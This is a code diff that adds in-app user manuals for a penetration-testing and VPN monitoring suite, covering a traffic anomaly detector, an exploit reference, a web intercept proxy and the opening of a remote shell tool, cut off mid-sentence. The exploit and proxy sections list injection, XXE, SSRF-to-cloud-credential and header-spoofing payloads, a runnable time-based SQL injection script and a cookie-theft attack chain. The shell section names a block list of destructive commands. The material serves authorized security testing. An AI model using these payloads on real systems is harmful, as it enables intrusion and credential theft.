@@ -2619,23 +2619,5150 @@ TABLE OF CONTENTS
 INTERNAL DOCUMENT — DO NOT DISTRIBUTE
 Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
   },
+  {
+    id: "ghost-trace-manual",
+    title: "Ghost Trace — Behavioral Analysis Engine",
+    subtitle: "WireGuard peer monitoring, C2 detection, exfiltration detection, and anomaly scoring",
+    version: "1.4",
+    pages: 18,
+    icon: Eye,
+    iconColor: "text-purple-400",
+    tier: "pro",
+    content: `Ghost Trace — Behavioral Analysis Engine — User Manual
+Version 1.4 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview & Architecture
+2. Baseline Learning Period
+3. Detection Categories
+4. Anomaly Scoring System
+5. Per-Device Timeline Heatmap
+6. Alert Panel & Triage
+7. Quick-Block Integration
+8. Alert Thresholds & Configuration
+9. API Reference
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW & ARCHITECTURE
+
+  Ghost Trace is ProxhqVPN's VPN-native agentless behavioral
+  analysis engine. It monitors every WireGuard peer for anomalous
+  outbound traffic patterns — without installing any software on
+  the monitored device itself.
+
+  What makes Ghost Trace unique: it operates at the WireGuard
+  tunnel level. Every device connected to your VPN passes all
+  traffic through the ProxhqVPN server. Ghost Trace observes
+  every packet at this chokepoint — the device has no way to hide
+  outbound connections from it.
+
+  Backend: Express API at /api/ghost-trace
+  Frontend: /ghost-trace (Command Center Pro)
+  DB tables: ghost_trace_observations, ghost_trace_baselines
+
+  Monitored per peer:
+  • Total bytes in / bytes out per hour
+  • Destination IPs and ports
+  • Connection frequency (packets per minute)
+  • Protocol distribution (HTTPS, DNS, NTP, SSH, etc.)
+  • Geographic distribution of destinations
+
+2. BASELINE LEARNING PERIOD
+
+  Ghost Trace builds a behavioral baseline for each peer during
+  the first 24 hours after the device connects to your VPN.
+
+  During baseline learning:
+  • No alerts are generated (learning badge shown in UI)
+  • All traffic flows are recorded and statistical models built
+  • Normal destination IP ranges are learned per device
+  • Typical bytes/hour thresholds established
+
+  After 24 hours, the baseline is frozen and deviation detection
+  starts. If a device reconnects after 7+ days absent, baseline
+  relearning begins automatically.
+
+  You can manually reset the baseline for any peer via:
+  Ghost Trace → Peer List → [device] → Reset Baseline
+
+3. DETECTION CATEGORIES
+
+  C2 BEACONING
+    Detected when: a peer sends periodic small-packet bursts to
+    the same destination IP at regular intervals.
+
+    Classic signature:
+    • Packet size: 64–512 bytes
+    • Interval: every 30–300 seconds (±5% jitter)
+    • Duration: sustained for 30+ minutes
+    • Direction: outbound only (no meaningful inbound response)
+
+    Common sources: RATs, post-exploitation frameworks (Cobalt
+    Strike, Metasploit Meterpreter), mobile spyware.
+
+  DATA EXFILTRATION
+    Detected when: bytes-out significantly exceeds bytes-in over
+    a sustained period, to IPs not in the device's normal pattern.
+
+    Thresholds (configurable):
+    • High: > 500 MB outbound in 60 minutes to a new IP
+    • Critical: > 2 GB outbound to a single non-CDN IP
+
+    Context exclusions: Google Drive, Dropbox, iCloud, OneDrive
+    IPs are whitelisted by default to reduce false positives.
+
+  MALICIOUS DESTINATION
+    Detected when: any connection is made to an IP or domain
+    matching known threat intelligence feeds:
+    • AbuseIPDB confidence score > 80
+    • Emerging Threats IP blocklist
+    • Spamhaus DROP/EDROP
+    • Known Tor exit node (if Tor use is not expected)
+    • Known botnet C2 infrastructure
+
+    Feed updates: every 4 hours automatically.
+
+  GHOST TRAFFIC
+    Detected when: outbound traffic originates from a peer that
+    is not associated with any user-visible application.
+    Signature: traffic at times when device activity logs show
+    the device is idle (screen off, no keyboard/mouse events).
+    Indicates: rootkits, kernel-level implants, or hardware
+    backdoors (rare but detectable via timing patterns).
+
+  ANOMALOUS PORT USAGE
+    Detected when: a peer connects to non-standard ports that
+    it has not used historically:
+    • Port 4444 (Metasploit default)
+    • Port 1337, 31337 (common RAT ports)
+    • Port 9050 (Tor — if not expected)
+    • High ephemeral ports used for exfiltration (>50000)
+
+4. ANOMALY SCORING SYSTEM
+
+  Each peer gets a real-time anomaly score from 0 to 100.
+
+  Score ranges:
+    0–30   CLEAN — normal behavior
+    31–60  WATCH — minor deviations, informational only
+    61–80  ELEVATED — review recommended
+    81–90  HIGH — alert generated, manual review required
+    91–100 CRITICAL — auto-populate Firewall block suggestion
+
+  Score contributors (additive):
+    +15  Known bad destination IP (threat feed match)
+    +20  Confirmed C2 beaconing pattern
+    +25  Data exfiltration threshold crossed
+    +10  Anomalous port usage
+    +10  Traffic at anomalous time (device normally idle)
+    +30  Multiple categories triggered simultaneously
+
+  Score decays 5 points per hour with no new anomaly events.
+
+5. PER-DEVICE TIMELINE HEATMAP
+
+  Each peer has a 24-hour traffic heatmap visualization showing:
+  • X-axis: time (hour 0–23)
+  • Y-axis: device (one row per registered WireGuard peer)
+  • Color intensity: traffic volume (green→yellow→red)
+
+  How to read it:
+  • Consistent activity across all hours → normal (always-on service)
+  • Burst at 3–4 AM with device otherwise idle → suspicious
+  • Sudden bandwidth spike to level never seen before → investigate
+  • Perfectly regular spikes at fixed intervals → potential C2
+
+  Click any hour cell to see the full flow log for that peer and
+  that specific hour: destination IPs, ports, bytes, protocol.
+
+6. ALERT PANEL & TRIAGE
+
+  All anomaly alerts appear in Ghost Trace → Alerts tab.
+  Each alert shows:
+  • Peer (device name / WireGuard public key prefix)
+  • Alert type (C2 / Exfil / Malicious Dest / Ghost / Port)
+  • First seen / Last seen timestamps
+  • Anomaly score at time of alert
+  • Top destination IP(s) involved
+  • Traffic sample (bytes in/out, packet rate)
+
+  Triage workflow:
+  1. Review the alert details and timeline heatmap for context.
+  2. Check the destination IP in Threat Intel (/threat-intel).
+  3. If confirmed malicious: click "Block IP" → adds to Firewall.
+  4. If false positive: click "Mark Safe" → adds to peer whitelist.
+  5. If uncertain: click "Watch" → keeps in watch list, no block.
+
+7. QUICK-BLOCK INTEGRATION
+
+  From any Ghost Trace alert or observation:
+  • Click "Block IP" → the destination IP is immediately added to
+    the Firewall blocklist across all VPN nodes.
+  • The peer remains connected to your VPN — only the specific
+    malicious destination is blocked, not the device itself.
+  • A corresponding Firewall rule is created: you can review and
+    remove it in Firewall → Rules at any time.
+
+  To block the entire peer (device) from VPN access:
+  Ghost Trace → Peer List → [device] → Revoke VPN Access
+  This removes the peer's WireGuard public key from the server.
+
+8. ALERT THRESHOLDS & CONFIGURATION
+
+  Ghost Trace → Settings → Thresholds:
+
+  Beacon Detection Sensitivity:
+    Low (fewer alerts):    interval 60–300s, 45+ minutes sustained
+    Medium (default):      interval 30–300s, 30+ minutes sustained
+    High (more alerts):    interval 10–300s, 15+ minutes sustained
+
+  Exfiltration Threshold:
+    Default: 500 MB in 60 min to non-CDN IP
+    Adjustable: 100 MB – 10 GB (slider)
+
+  Auto-Block on Critical Score:
+    Default: OFF (manual review recommended first)
+    Enable: auto-blocks firewall when score exceeds 90
+
+  Whitelist Destinations:
+    Add known-good IPs/CIDRs to suppress false positives.
+    Example: add your backup provider's IP range.
+
+9. API REFERENCE
+
+  GET  /api/ghost-trace/observations  List all observations
+  GET  /api/ghost-trace/observations/:peerId  Per-peer
+  GET  /api/ghost-trace/baselines     Baseline data per peer
+  POST /api/ghost-trace/baselines/:peerId/reset  Reset baseline
+  GET  /api/ghost-trace/alerts        Active alerts
+  POST /api/ghost-trace/alerts/:id/acknowledge  Ack alert
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "ghost-chain-manual",
+    title: "Ghost Chain — Exploit Reference & Kill Chain Builder",
+    subtitle: "200+ exploit techniques, PoC code, and attack path correlation engine",
+    version: "2.0",
+    pages: 24,
+    icon: Network,
+    iconColor: "text-red-500",
+    tier: "pro",
+    content: `Ghost Chain — Exploit Reference & Kill Chain Builder — User Manual
+Version 2.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+LEGAL NOTICE: Ghost Chain is a security research and penetration
+testing reference tool. All exploitation techniques described are
+for authorized testing only. Only test systems you own or have
+explicit written permission to test.
+ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Exploit Categories (4 categories, 200+ techniques)
+3. Exploit Entry Format
+4. PoC Code & Proof-of-Exploitation
+5. Attack Chain Builder
+6. 5-Stage Kill Chain Pipeline
+7. Chain Correlation Engine
+8. Integration with Other Tools
+9. Exporting Findings
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  Ghost Chain is ProxhqVPN's integrated exploit reference library
+  and attack chain builder. It provides:
+
+  • 200+ exploit techniques across 4 major categories
+  • Ready-to-use PoC code (Python, Bash, JavaScript, SQL, XML)
+  • 5-stage automated kill chain discovery pipeline
+  • Attack path correlation (links multiple findings into chains)
+  • SVG chain graph visualization
+  • One-click export of complete chains as Markdown reports
+
+  All Ghost Chain traffic is routed through your VPN tunnel.
+  Pair with HTTP Probe or Intruder for live payload testing.
+
+2. EXPLOIT CATEGORIES
+
+  CATEGORY 1: INJECTION (60+ techniques)
+
+    SQL Injection:
+    • Boolean-blind: payload that changes response based on
+      true/false condition (AND 1=1 vs AND 1=2)
+    • UNION-based: UNION SELECT to extract columns directly
+    • Error-based: force DB error messages to leak data
+    • Time-based blind: SLEEP(5) / WAITFOR DELAY to confirm
+    • Out-of-band (OOB): DNS/HTTP callback for blind exfil
+    • Stacked queries: ; DROP TABLE via stacked query support
+    • Second-order: store payload, trigger in different context
+
+    Cross-Site Scripting (XSS):
+    • Reflected: payload returned in same response
+    • Stored: payload persisted in database, affects all users
+    • DOM-based: payload processed by client-side JS
+    • CSP bypass: nonce reuse, unsafe-eval, JSONP endpoints
+    • Mutation XSS: browser DOM mutation changes escaped chars
+
+    Server-Side Template Injection (SSTI):
+    • Jinja2: {{7*7}}, {{config}}, {{request.application...}}
+    • Twig: {{_self.env.registerUndefinedFilterCallback...}}
+    • FreeMarker: \${freemarker.template.utility.Execute?...}
+    • Pebble: {{runtime.exec('id')}}
+
+    Command Injection:
+    • Linux: ; id, | id, && id, \`id\`, $(id)
+    • Windows: & whoami, | whoami, ; whoami
+    • Blind OOB: curl/ping callback to OAST server
+
+    LDAP / NoSQL / XPATH Injection:
+    • LDAP: *)(&, *)(|(password=*)
+    • MongoDB: {"$gt": ""}, {"$where": "1==1"}
+    • XPATH: ' or '1'='1, '] | //*[contains(., '
+
+  CATEGORY 2: SERVER-SIDE VULNERABILITIES (50+ techniques)
+
+    SSRF (Server-Side Request Forgery):
+    • Internal service access: http://127.0.0.1:PORT/path
+    • Cloud metadata: http://169.254.169.254/latest/meta-data/
+    • AWS IMDSv1 token: iam/security-credentials/
+    • GCP metadata: http://metadata.google.internal/computeMetadata/
+    • SSRF to RCE chains (via Redis, Memcached, etc.)
+    • Bypass filters: http://[::1]/, http://0x7f000001/, decimal IP
+
+    XML External Entity (XXE):
+    • File read: <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    • SSRF via XXE: SYSTEM "http://internal-service/"
+    • Out-of-band XXE: parameter entities + OOB callback
+    • XXE in XLSX/DOCX/SVG upload parsers
+    • Billion laughs (DoS): recursive entity expansion
+
+    Insecure Deserialization:
+    • Java gadget chains: commons-collections, spring, JDK
+    • PHP: O:4:"User":1:{s:4:"data";s:4:"exec";}
+    • Python pickle: REDUCE opcode for arbitrary execution
+    • .NET: BinaryFormatter ViewState attacks
+    • YAML: !!python/object/apply:os.system
+
+    Path Traversal / LFI:
+    • ../../../../etc/passwd (URL-encoded variants)
+    • Null byte bypass: file.php%00.jpg
+    • Log poisoning → RCE (access.log, /proc/self/environ)
+    • PHP wrappers: php://filter, php://input, zip://
+
+  CATEGORY 3: AUTHENTICATION & TOKENS (40+ techniques)
+
+    JWT Attacks: (full coverage in JWT Analyzer tool)
+    • alg:none — unsigned token acceptance
+    • RS256→HS256 algorithm confusion
+    • jku/x5u header injection
+    • kid SQL injection (6 payloads)
+    • Claim escalation (role, admin, scope, plan)
+    • JWKS spoofing endpoint
+
+    OAuth 2.0 Attacks:
+    • Open redirect via redirect_uri
+    • State parameter fixation/CSRF
+    • Authorization code interception
+    • Implicit flow token leakage
+    • PKCE downgrade
+
+    Session & Password:
+    • Password reset poisoning via Host header
+    • Username enumeration via timing/response
+    • 2FA bypass: response manipulation, backup codes
+    • Session fixation: pre-auth session adoption
+
+  CATEGORY 4: WEB & PROTOCOL ATTACKS (50+ techniques)
+
+    HTTP Request Smuggling:
+    • CL.TE: Content-Length vs Transfer-Encoding conflict
+    • TE.CL: Transfer-Encoding leads, Content-Length trails
+    • TE.TE: both present but obfuscated (TE:  chunked)
+    • Detection: timing oracle on POST to /
+    • Impact: cache poisoning, session hijacking, WAF bypass
+
+    CORS Misconfiguration:
+    • Null origin reflection
+    • Wildcard with credentials (impossible but misconfigured)
+    • Trusted subdomain compromise → full origin
+
+    Cache Poisoning:
+    • X-Forwarded-Host header cache key exclusion
+    • Fat GET: body parameter injected into cached response
+    • Cache key normalization attacks
+
+    Subdomain Takeover:
+    • Detect: CNAME pointing to decommissioned service
+    • Services: Heroku, GitHub Pages, Netlify, Fastly, S3
+    • Impact: full XSS on parent domain's subdomains
+
+3. EXPLOIT ENTRY FORMAT
+
+  Each of the 200+ exploit entries contains:
+
+  Details Tab:
+  • Vulnerability description and root cause
+  • How the vulnerability works (step by step)
+  • Real-world CVE examples
+  • Impact assessment (what an attacker can do)
+  • Detection methods
+
+  Exploit PoC Tab:
+  • Ready-to-use proof-of-concept code
+  • Language: Python, Bash, JavaScript, SQL, XML, or YAML
+  • One-click copy button
+  • Target variable placeholders clearly marked (TARGET_URL, etc.)
+
+  Remediation Tab:
+  • How to fix the vulnerability
+  • Secure code example (before/after)
+  • Framework-specific fixes
+
+4. POC CODE & PROOF-OF-EXPLOITATION
+
+  All PoC code is copy-ready. Replace placeholder values:
+    TARGET_URL    → the full URL of the target endpoint
+    PARAM         → the vulnerable parameter name
+    CALLBACK_URL  → your OAST server URL (from OAST Tester)
+    COOKIE        → session cookie value from HTTP Interceptor
+
+  Example — Time-Based SQLi detection:
+  ---
+  python3 -c "
+  import requests, time
+  url = 'TARGET_URL'
+  payload = \"' AND SLEEP(5)-- -\"
+  start = time.time()
+  r = requests.get(url, params={'id': payload})
+  elapsed = time.time() - start
+  print('VULNERABLE' if elapsed > 4 else 'NOT VULNERABLE')
+  print(f'Response time: {elapsed:.2f}s')
+  "
+  ---
+
+5. ATTACK CHAIN BUILDER
+
+  The Chain Builder (Ghost Chain → Chain Builder tab) lets you
+  assemble multiple findings into a complete attack narrative.
+
+  Adding findings to a chain:
+  1. Browse to any exploit in the library.
+  2. Click "Add to Chain" (+ icon in top right of exploit entry).
+  3. Repeat for each vulnerability in the chain.
+  4. Navigate to Chain Builder → review the assembled chain.
+  5. Drag findings to reorder the attack sequence.
+  6. Add notes between steps for context.
+  7. Click "Export Chain" to download as Markdown report.
+
+  Example attack chain:
+  Step 1: OSINT Recon → discover /admin panel exists (via crt.sh)
+  Step 2: Subdomain Takeover → found CNAME to dead Heroku app
+  Step 3: Stored XSS on subdomain → capture cookies of parent domain
+  Step 4: Account takeover via stolen admin session
+  Step 5: SSRF via admin panel → access internal metadata service
+
+6. 5-STAGE AUTOMATED KILL CHAIN PIPELINE
+
+  Ghost Chain → Automated Pipeline tab:
+
+  Stage 1: SURFACE DISCOVERY
+    Passive: OSINT Recon (DNS, crt.sh, AlienVault, certs)
+    Active: Port scan (top 1000 ports), service fingerprint
+
+  Stage 2: TECHNOLOGY FINGERPRINTING
+    HTTP headers → framework, server, language
+    JavaScript files → libraries and versions
+    Error messages → backend stack traces
+    Cookie names → framework signatures (PHPSESSID, JSESSIONID)
+
+  Stage 3: VULNERABILITY TESTING
+    Runs 40 lightweight probes:
+    • XSS reflection test on all parameters
+    • SQL injection error detection
+    • Path traversal (../../../etc/passwd)
+    • Open redirect (?next=https://evil.com)
+    • CORS any-origin test
+    • Default credentials on common admin panels
+    • Exposed Git/SVN directories
+
+  Stage 4: CHAIN CORRELATION
+    Correlates findings into attack paths:
+    • Groups findings by exploitation prerequisite
+    • Identifies which findings chain together
+    • Calculates combined impact score (higher than individual)
+
+  Stage 5: IMPACT ASSESSMENT
+    Assigns final CVSS score to the complete chain.
+    Produces executive summary + technical report.
+    SVG chain graph shows findings as nodes with attack path arrows.
+
+7. INTEGRATION WITH OTHER TOOLS
+
+  Send to HTTP Probe:
+    From any exploit entry: click "Send to HTTP Probe"
+    → pre-fills the URL, method, headers, and payload body.
+    → Use HTTP Probe to test the payload against a live target.
+
+  Send to Intruder:
+    From any payload list: click "Send to Intruder"
+    → loads the payload list for automated fuzzing.
+    → Intruder tests all payloads against the target parameter.
+
+  Import to Ghost Chain from OmniStrike:
+    After an OmniStrike scan, confirmed findings can be added to
+    a Ghost Chain chain via the "Add to Ghost Chain" button in
+    each finding detail panel.
+
+  Send to OAST Tester:
+    For OOB techniques, Ghost Chain generates the callback URL
+    from your OAST server automatically.
+
+8. EXPORTING FINDINGS
+
+  Chain Report (Markdown):
+  • Title, date, target
+  • Each step: technique name, evidence, impact, remediation
+  • CVSS scores per finding + aggregate chain score
+  • PoC code blocks included
+  • Download: Chain Builder → Export → Markdown
+
+  Single Finding Report:
+  • Exploit Details → Export → copies formatted text to clipboard
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "http-interceptor-manual",
+    title: "HTTP Interceptor — Web Proxy",
+    subtitle: "Full intercept proxy: request/response editing, WebSocket, Match & Replace, replay",
+    version: "1.6",
+    pages: 20,
+    icon: Globe,
+    iconColor: "text-blue-400",
+    tier: "pro",
+    content: `HTTP Interceptor — Web Proxy — User Manual
+Version 1.6 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Browser Proxy Setup (Firefox, Chrome, Safari)
+3. CA Certificate Installation (HTTPS decryption)
+4. Core Intercept Workflow
+5. Request Editing Reference
+6. Response Intercept
+7. WebSocket Interception
+8. Match & Replace Rules
+9. Request History & Replay
+10. Integration with Other Tools
+11. Tips & Common Workflows
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  HTTP Interceptor is a full web proxy equivalent to Burp Suite's
+  Proxy module. It sits between your browser and the target,
+  intercepting every HTTP/HTTPS request before it's sent and every
+  response before it's displayed.
+
+  What it enables:
+  • View and modify any request in transit
+  • Inject payloads without modifying the page source
+  • Test authentication bypass by modifying headers/cookies
+  • Intercept WebSocket frames (ws:// and wss://)
+  • Define auto-modify rules that apply to every request
+  • Build a complete history of all traffic for replay/analysis
+
+  Backend proxy port: shown on the Interceptor page (default 8082)
+  Frontend: /http-interceptor (Command Center Pro)
+
+2. BROWSER PROXY SETUP
+
+  The HTTP Interceptor is a local MITM proxy. Your browser must
+  be configured to route traffic through it.
+
+  FIREFOX:
+  1. Settings → General → Network Settings → Manual proxy
+  2. HTTP Proxy: 127.0.0.1  Port: [shown on Interceptor page]
+  3. Check "Also use this proxy for HTTPS"
+  4. Click OK.
+
+  CHROME / EDGE:
+  Option A — System proxy (applies to all browsers):
+  Linux:  export http_proxy=http://127.0.0.1:8082
+          export https_proxy=http://127.0.0.1:8082
+  macOS:  System Prefs → Network → Proxies → Web Proxy
+  Windows: Settings → Proxy → Manual proxy setup
+
+  Option B — Chrome extension (SwitchyOmega recommended):
+  1. Install SwitchyOmega extension.
+  2. Create a profile: Protocol HTTP, Server 127.0.0.1, Port 8082.
+  3. Activate the profile via the extension icon.
+
+  MOBILE DEVICES (same WiFi network):
+  1. Set WiFi proxy on device:
+     Server: [your computer's LAN IP]  Port: 8082
+  2. Install the CA certificate on the device (see Section 3).
+  3. All mobile HTTP/HTTPS traffic now flows through Interceptor.
+
+3. CA CERTIFICATE INSTALLATION
+
+  HTTPS traffic is encrypted. To decrypt it, you must install
+  the Interceptor's CA certificate in your browser/OS so the
+  MITM is trusted.
+
+  Download the CA cert:
+  HTTP Interceptor → Settings → Download CA Certificate (.pem)
+
+  Install in Firefox:
+  Settings → Privacy & Security → Certificates → View Certificates
+  → Authorities → Import → select the .pem file
+  → Check "Trust this CA to identify websites" → OK
+
+  Install in Chrome / system (macOS):
+  Keychain Access → drag .pem onto "System" keychain
+  → Double-click → Trust → "When using this certificate" → Always Trust
+
+  Install in Chrome / system (Windows):
+  certmgr.msc → Trusted Root Certification Authorities
+  → Action → All Tasks → Import → select .pem
+
+  Install on Android:
+  Settings → Security → Install from storage → select .pem
+  (May require setting a screen lock first)
+
+  Install on iOS:
+  Safari → navigate to http://[interceptor-ip]:8082/ca.pem
+  → "Allow" → Settings → Profile Downloaded → Install → Trust
+
+  WARNING: Remove the CA certificate when done testing.
+  Leaving it installed is a security risk.
+
+4. CORE INTERCEPT WORKFLOW
+
+  Step 1: Start the Interceptor
+    HTTP Interceptor → click "Start Proxy"
+    The status indicator shows the proxy port (default 8082).
+    Toggle "Intercept ON" to enable request pausing.
+
+  Step 2: Configure your browser (see Section 2).
+
+  Step 3: Browse to the target site in your browser.
+
+  Step 4: The browser hangs — the Interceptor has caught a request.
+    The Interceptor panel shows the full raw HTTP request:
+    [METHOD] [PATH] HTTP/1.1
+    Host: [target]
+    [headers...]
+    [body if POST]
+
+  Step 5: Review and optionally edit the request.
+    • Change method (GET → POST)
+    • Add, modify, or delete headers
+    • Edit cookies
+    • Modify the request body
+    • Change query parameters in the URL
+
+  Step 6: Choose an action:
+    Forward — send the (modified) request and catch next
+    Forward All — send this and all future requests without pausing
+    Drop — discard this request (browser gets no response)
+    Repeat — forward and immediately re-intercept the same request
+
+  Step 7: Toggle "Intercept OFF" to pass-through all traffic
+    without pausing. Traffic still appears in the History tab.
+
+5. REQUEST EDITING REFERENCE
+
+  Every part of an HTTP request is editable in the Interceptor:
+
+  Request Line:
+    Method: GET POST PUT DELETE PATCH HEAD OPTIONS TRACE
+    Path:    /api/user/profile → /api/user/admin
+    Protocol: HTTP/1.1 (do not change unless testing HTTP/2)
+
+  Common Header Manipulations:
+    Authorization: Bearer [token]     → replace token
+    Cookie: session=[value]           → replace session
+    Host: target.com                  → change for Host header attacks
+    X-Forwarded-For: 127.0.0.1       → IP spoofing for bypass
+    Content-Type: application/json    → change encoding
+    Origin: https://evil.com          → CORS testing
+    Referer: https://trusted.com/     → referer-based access control
+
+  Body (POST/PUT/PATCH):
+    JSON: modify any key/value in the JSON body
+    Form: key=value&key2=value2 format
+    XML: direct XML edit for SOAP/XXE testing
+    Binary: hex editor mode for binary protocols
+
+6. RESPONSE INTERCEPT
+
+  To intercept and modify server responses before they reach the
+  browser:
+
+  Toggle "Intercept Responses" in Interceptor settings.
+
+  Useful response modifications:
+  • Change HTTP status code: 403 → 200 (access control test)
+  • Remove security headers: Delete X-Frame-Options (clickjacking)
+  • Inject JavaScript: add <script>alert(1)</script> to response
+  • Modify JSON response body: change {"admin": false} → true
+  • Remove HSTS header: test for SSL stripping
+  • Change redirect destination: Location: /admin → /
+
+7. WEBSOCKET INTERCEPTION
+
+  HTTP Interceptor intercepts WebSocket frames on ws:// and wss://.
+
+  WebSocket panel shows:
+  • Direction: → (client→server) or ← (server→client)
+  • Frame timestamp
+  • Frame payload (text or binary)
+  • Frame opcode (text=1, binary=2, ping=9, pong=10)
+
+  To intercept WebSocket frames:
+  Settings → Enable WebSocket Intercept
+
+  Intercepted frames can be:
+  • Forwarded as-is
+  • Edited (text frames only)
+  • Dropped
+  • Replayed (resend the same frame)
+  • Injected: send arbitrary frames from the WS panel directly
+
+  Use cases:
+  • WebSocket message injection (XSS, SQLi via WS messages)
+  • Privilege escalation via WS message manipulation
+  • Denial of service (send malformed frames)
+
+8. MATCH & REPLACE RULES
+
+  Match & Replace rules automatically modify every request or
+  response that passes through the proxy without manual intercept.
+
+  Create rules: Interceptor → Match & Replace → + Add Rule
+
+  Rule structure:
+  • Scope: Request Headers / Request Body / Response Headers / Response Body
+  • Match: regex pattern (RE2 syntax) or literal string
+  • Replace: replacement string (supports $1 capture groups)
+  • Enabled: toggle per rule
+
+  Example rules:
+
+  Inject XSS probe into all responses:
+    Scope: Response Body
+    Match: </body>
+    Replace: <script>console.log('XSS-test-' + document.domain)</script></body>
+
+  Replace Authorization token globally:
+    Scope: Request Headers
+    Match: Authorization: Bearer [a-zA-Z0-9._-]+
+    Replace: Authorization: Bearer YOUR_TOKEN_HERE
+
+  Remove X-Frame-Options from all responses:
+    Scope: Response Headers
+    Match: X-Frame-Options: .*\r\n
+    Replace: (empty)
+
+  Add X-Forwarded-For to every request:
+    Scope: Request Headers
+    Match: ^Host: (.*)
+    Replace: Host: $1\r\nX-Forwarded-For: 127.0.0.1
+
+9. REQUEST HISTORY & REPLAY
+
+  All traffic that passes through the proxy (intercepted or
+  pass-through) is logged in the History tab.
+
+  History columns:
+  #     Sequential request number
+  Method  GET POST PUT DELETE etc.
+  Host    Target hostname
+  Path    Request path
+  Status  HTTP response status code
+  Length  Response body size in bytes
+  Time    Response time in milliseconds
+  MIME    Response Content-Type
+
+  Filtering history:
+  • Search box: filter by host, path, or response content
+  • Status filter: show only 2xx / 3xx / 4xx / 5xx
+  • Method filter: show only POST requests (for mutation testing)
+
+  Replay:
+  1. Click any history entry → full request shown in edit panel.
+  2. Modify any part of the request.
+  3. Click "Send" → response displayed.
+  4. Click "Diff" → compare this response to the original.
+
+  Send to other tools:
+  • "Send to Intruder" → use this request as Intruder base
+  • "Send to Repeater" → clone to standalone replay panel
+
+10. INTEGRATION WITH OTHER TOOLS
+
+  HTTP Interceptor works as the request capture layer for:
+
+  Intruder:
+    Capture a request → "Send to Intruder" → Intruder fuzzes
+    the marked parameter with a payload list automatically.
+
+  JWT Analyzer:
+    When a request contains an Authorization: Bearer header,
+    the Interceptor shows "Analyze JWT" → one click opens the
+    JWT Analyzer with the token pre-loaded.
+
+  Ghost Chain:
+    From any intercepted request, "Send to Ghost Chain" pre-fills
+    the HTTP Probe field with this request for PoC code generation.
+
+11. TIPS & COMMON WORKFLOWS
+
+  WORKFLOW: Test for SQL Injection
+  1. Browse to target's search page / login form.
+  2. Submit a form with Intercept ON.
+  3. In the caught request, change the field value to ' or '1'='1
+  4. Forward → observe response for DB error or different result.
+  5. If confirmed: Send to SQLMap for automated exploitation.
+
+  WORKFLOW: Test for IDOR
+  1. Log in as User A, capture a request for /api/account/123.
+  2. Log in as User B in a different browser (or incognito).
+  3. In Interceptor (still showing User A's session), change
+     Cookie to User B's session and /account/123 to /account/456.
+  4. Forward → if you get User A's data with User B's ID = IDOR.
+
+  WORKFLOW: Bypass IP Restriction
+  1. Get a 403 when accessing /admin.
+  2. Intercept the request, add: X-Forwarded-For: 127.0.0.1
+  3. Also try: X-Real-IP: 127.0.0.1  X-Client-IP: 127.0.0.1
+  4. Forward → if 200, the server trusts the header without validation.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "terminal-manual",
+    title: "Remote Terminal — 4-Tab Shell",
+    subtitle: "Shell execution, HTTP client, TCP port scanner, and audit log with ProxhqVPN Mode",
+    version: "2.2",
+    pages: 16,
+    icon: Terminal,
+    iconColor: "text-green-400",
+    tier: "pro",
+    content: `Remote Terminal — 4-Tab Shell — User Manual
+Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Admin Feature (Command Center Pro)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview & Security Model
+2. Tab 1 — Shell (Command Execution)
+3. ProxhqVPN Mode (Shell Bypass)
+4. Allowed Command Reference
+5. Tab 2 — HTTP Client
+6. Tab 3 — Port Scanner
+7. Tab 4 — Audit Log
+8. Security Constraints & Rate Limits
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW & SECURITY MODEL
+
+  The Terminal (/terminal) provides a web-based shell for executing
+  commands on your ProxhqVPN server infrastructure. It is an admin
+  tool — Clerk auth + admin role required to access.
+
+  Security model:
+  • Commands run as the ProxhqVPN service user (limited privileges)
+  • Shell commands are validated against an allowlist by default
+  • ProxhqVPN Mode bypasses the allowlist (full outbound access)
+  • HARD_BLOCKED destructive patterns are always enforced regardless
+    of mode: rm -rf /, mkfs, dd if=/dev/zero, format, shutdown, halt
+  • All commands logged to the audit trail (Tab 4) with timestamp,
+    output, and ProxhqVPN Mode status
+  • Rate limit: 20 commands per minute
+
+  Backend: Express API at /api/terminal
+  Frontend: /terminal (admin role required)
+
+2. TAB 1 — SHELL (COMMAND EXECUTION)
+
+  The Shell tab lets you execute Linux commands on your ProxhqVPN
+  server directly from the browser.
+
+  Interface:
+  • Command input field: type any command and press Enter or click Run
+  • Output panel: shows stdout + stderr in real-time
+  • Session: commands share the same working directory within a
